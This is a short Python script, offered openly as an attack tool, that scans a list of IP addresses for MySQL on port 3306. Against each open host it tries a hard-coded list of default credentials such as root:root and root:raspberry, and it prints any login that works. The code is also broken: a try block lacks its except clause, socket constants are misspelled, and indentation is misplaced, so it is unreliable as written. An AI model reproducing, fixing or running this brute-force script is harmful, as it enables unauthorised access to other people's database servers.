import socket, mysql.connector
from mysql.connector import errorcode

# The list of IP's you want to BruteForce
lst = 'ips.txt'

# Your user:passwd combo - you can add more if you like, or remove some
# I just used most common one's
passwds = [
    'root:root',
    'root:admin',
    'root:password',
    'root:passwd',
    'root:shopware',
    'root:mysql',
    'root:chippc',
    'admin:admin',
    'root:nagiosxi',
    'root:usbw',
    'cloudera:cloudera',
    'root:cloudera',
    'root:moves',
    'root:testpw',
    'root:mktt',
    'root:123',
    'dbuser:123',
    'root:raspberry',
    'root:openauditrootuserpassword',
    'root:vagrant'
]

def raffy(ip:str):
    for combo in passwds:
        combo = combo.split(':')

        try:
            con = mysql.connector.connect(user=combo[0], password=combo[1], host=ip)
            con.close()
            print('Working login found! - username: '+combo[0] +' password: '+combo[1] +'host: '+ip)

def check(ip:str):
    soc = socket.socket(socket.AF_INIT, socket_SOCKET_STREAM)
    soc.settimeout(2)
    try:
        soc.connect((ip, 3306)) # mysql port :)
        raffy(ip)
        except:
            pass

def main():
    f = open(lst, 'r')
    r = f.readlines()
    for x in r:
        x = x.strip('\n')
        check(x)

if __name__ == '__main__':
    main()
